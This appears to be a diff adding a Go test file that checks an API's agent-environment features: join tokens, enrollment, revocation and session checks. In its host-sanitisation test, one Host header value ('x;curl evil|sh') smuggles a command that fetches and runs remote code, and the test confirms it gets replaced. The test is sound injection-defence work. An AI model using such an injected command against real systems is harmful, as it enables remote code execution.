@@ -1,0 +1,229 @@
+package api
+
+import (
+	"encoding/json"
+	"fmt"
+	"net/http"
+	"net/http/httptest"
+	"strings"
+	"testing"
+
+	"git.zefirlabs.net/zefir/nudge/backend/internal/docker/dockertest"
+)
+
+func createAgentEnv(t *testing.T, et envTest, name string) createdEnvironmentResponse {
+	t.Helper()
+	rec := do(t, et.h, request{method: "POST", path: "/api/v1/environments", body: fmt.Sprintf(`{"name":%q,"kind":"agent"}`, name), cookie: et.cookie})
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("create: code = %d (%s)", rec.Code, rec.Body)
+	}
+	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
+		t.Errorf("Cache-Control = %q, want no-store on a response with a join token", cc)
+	}
+	var got createdEnvironmentResponse
+	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
+		t.Fatal(err)
+	}
+	return got
+}
+
+func enroll(t *testing.T, et envTest, token string) *httptest.ResponseRecorder {
+	t.Helper()
+	return do(t, et.h, request{method: "POST", path: "/api/v1/agents/enroll", body: fmt.Sprintf(`{"join_token":%q}`, token)})
+}
+
+func agentOf(t *testing.T, et envTest, id int64) *agentResponse {
+	t.Helper()
+	rec := do(t, et.h, request{method: "GET", path: "/api/v1/environments", cookie: et.cookie})
+	var envs []environmentResponse
+	if err := json.Unmarshal(rec.Body.Bytes(), &envs); err != nil {
+		t.Fatal(err)
+	}
+	for _, e := range envs {
+		if e.ID == id {
+			return e.Agent
+		}
+	}
+	t.Fatalf("environment %d not listed: %s", id, rec.Body)
+	return nil
+}
+
+func TestCreateAgentEnvironment(t *testing.T) {
+	t.Parallel()
+	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
+	got := createAgentEnv(t, et, "nas")
+	if got.Name != "nas" || got.Kind != "agent" || got.Online || got.Agent == nil || got.Agent.Enrolled {
+		t.Errorf("environment = %+v", got.environmentResponse)
+	}
+	jt := got.JoinToken
+	if !strings.HasPrefix(jt.Token, "nudge_join_") || jt.ExpiresAt.IsZero() {
+		t.Errorf("join token = %+v", jt)
+	}
+	for _, want := range []string{"-e NUDGE_SERVER_URL=http://example.com ", "-e NUDGE_JOIN_TOKEN=" + jt.Token + " ", "nudge:latest agent"} {
+		if !strings.Contains(jt.DockerRun, want) {
+			t.Errorf("docker run %q lacks %q", jt.DockerRun, want)
+		}
+	}
+	if a := agentOf(t, et, got.ID); a == nil || a.Enrolled {
+		t.Errorf("listed agent = %+v, want not enrolled", a)
+	}
+	if a := agentOf(t, et, et.ids["local"]); a != nil {
+		t.Errorf("local environment has agent fields: %+v", a)
+	}
+
+	tests := []struct {
+		name     string
+		body     string
+		noCookie bool
+		wantCode int
+	}{
+		{name: "local kind", body: `{"name":"x","kind":"local"}`, wantCode: 400},
+		{name: "no kind", body: `{"name":"x"}`, wantCode: 400},
+		{name: "bad name", body: `{"name":" x","kind":"agent"}`, wantCode: 400},
+		{name: "taken name", body: `{"name":"nas","kind":"agent"}`, wantCode: 409},
+		{name: "malformed", body: `{`, wantCode: 400},
+		{name: "no session", body: `{"name":"y","kind":"agent"}`, noCookie: true, wantCode: 401},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			req := request{method: "POST", path: "/api/v1/environments", body: tt.body, cookie: et.cookie}
+			if tt.noCookie {
+				req.cookie = nil
+			}
+			if rec := do(t, et.h, req); rec.Code != tt.wantCode {
+				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
+			}
+		})
+	}
+}
+
+func TestDockerRunHost(t *testing.T) {
+	t.Parallel()
+	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
+	tests := []struct {
+		host string
+		want string
+	}{
+		{host: "nudge.example.net:8443", want: "NUDGE_SERVER_URL=http://nudge.example.net:8443 "},
+		{host: "[::1]:8080", want: "NUDGE_SERVER_URL=http://[::1]:8080 "},
+		{host: "x;curl evil|sh", want: "NUDGE_SERVER_URL=https://<server> "},
+	}
+	for _, tt := range tests {
+		r := httptest.NewRequest(http.MethodPost, "/api/v1/environments", strings.NewReader(fmt.Sprintf(`{"name":%q,"kind":"agent"}`, "env-"+tt.host)))
+		r.Host = tt.host
+		r.AddCookie(et.cookie)
+		rec := httptest.NewRecorder()
+		et.h.ServeHTTP(rec, r)
+		var got createdEnvironmentResponse
+		if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil || rec.Code != http.StatusCreated {
+			t.Fatalf("%s: code = %d (%s)", tt.host, rec.Code, rec.Body)
+		}
+		if !strings.Contains(got.JoinToken.DockerRun, tt.want) {
+			t.Errorf("%s: docker run %q, want %q", tt.host, got.JoinToken.DockerRun, tt.want)
+		}
+	}
+}
+
+func TestEnrollAgent(t *testing.T) {
+	t.Parallel()
+	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
+	created := createAgentEnv(t, et, "nas")
+
+	rec := enroll(t, et, created.JoinToken.Token)
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("enroll: code = %d (%s)", rec.Code, rec.Body)
+	}
+	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
+		t.Errorf("Cache-Control = %q, want no-store on a response with a secret", cc)
+	}
+	var creds enrollResponse
+	if err := json.Unmarshal(rec.Body.Bytes(), &creds); err != nil {
+		t.Fatal(err)
+	}
+	if creds.EnvironmentID != created.ID || !strings.HasPrefix(creds.AgentID, "agt_") || !strings.HasPrefix(creds.AgentSecret, "nudge_agent_") {
+		t.Errorf("creds = %+v", creds)
+	}
+	if a := agentOf(t, et, created.ID); a == nil || !a.Enrolled {
+		t.Errorf("listed agent = %+v, want enrolled", a)
+	}
+
+	tests := []struct {
+		name     string
+		body     string
+		wantCode int
+	}{
+		{name: "used token", body: fmt.Sprintf(`{"join_token":%q}`, created.JoinToken.Token), wantCode: 401},
+		{name: "unknown token", body: `{"join_token":"nudge_join_00"}`, wantCode: 401},
+		{name: "no token", body: `{}`, wantCode: 401},
+		{name: "malformed", body: `nope`, wantCode: 400},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			rec := do(t, et.h, request{method: "POST", path: "/api/v1/agents/enroll", body: tt.body})
+			if rec.Code != tt.wantCode {
+				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
+			}
+		})
+	}
+}
+
+func TestJoinTokenAndRevoke(t *testing.T) {
+	t.Parallel()
+	et := newEnvTest(t, map[string]*dockertest.Fake{"local": {}})
+	created := createAgentEnv(t, et, "nas")
+	path := func(id int64, rest string) string { return fmt.Sprintf("/api/v1/environments/%d%s", id, rest) }
+
+	rec := do(t, et.h, request{method: "POST", path: path(created.ID, "/join-tokens"), cookie: et.cookie})
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("new join token: code = %d (%s)", rec.Code, rec.Body)
+	}
+	var jt joinTokenResponse
+	if err := json.Unmarshal(rec.Body.Bytes(), &jt); err != nil {
+		t.Fatal(err)
+	}
+	if jt.Token == created.JoinToken.Token || !strings.Contains(jt.DockerRun, jt.Token) {
+		t.Errorf("join token = %+v, want a new one", jt)
+	}
+	if rec := enroll(t, et, created.JoinToken.Token); rec.Code != http.StatusUnauthorized {
+		t.Errorf("replaced token: code = %d, want 401", rec.Code)
+	}
+	if rec := enroll(t, et, jt.Token); rec.Code != http.StatusCreated {
+		t.Fatalf("enroll: code = %d (%s)", rec.Code, rec.Body)
+	}
+
+	if rec := do(t, et.h, request{method: "DELETE", path: path(created.ID, "/credentials"), cookie: et.cookie}); rec.Code != http.StatusNoContent {
+		t.Fatalf("revoke: code = %d (%s)", rec.Code, rec.Body)
+	}
+	if a := agentOf(t, et, created.ID); a == nil || a.Enrolled {
+		t.Errorf("after revoke: agent = %+v, want not enrolled", a)
+	}
+
+	tests := []struct {
+		name     string
+		method   string
+		path     string
+		noCookie bool
+		wantCode int
+	}{
+		{name: "token for local", method: "POST", path: path(et.ids["local"], "/join-tokens"), wantCode: 409},
+		{name: "revoke local", method: "DELETE", path: path(et.ids["local"], "/credentials"), wantCode: 409},
+		{name: "token for unknown", method: "POST", path: path(999, "/join-tokens"), wantCode: 404},
+		{name: "revoke unknown", method: "DELETE", path: "/api/v1/environments/x/credentials", wantCode: 404},
+		{name: "token without session", method: "POST", path: path(created.ID, "/join-tokens"), noCookie: true, wantCode: 401},
+		{name: "revoke without session", method: "DELETE", path: path(created.ID, "/credentials"), noCookie: true, wantCode: 401},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			req := request{method: tt.method, path: tt.path, cookie: et.cookie}
+			if tt.noCookie {
+				req.cookie = nil
+			}
+			if rec := do(t, et.h, req); rec.Code != tt.wantCode {
+				t.Errorf("code = %d, want %d (%s)", rec.Code, tt.wantCode, rec.Body)
+			}
+		})
+	}
+}
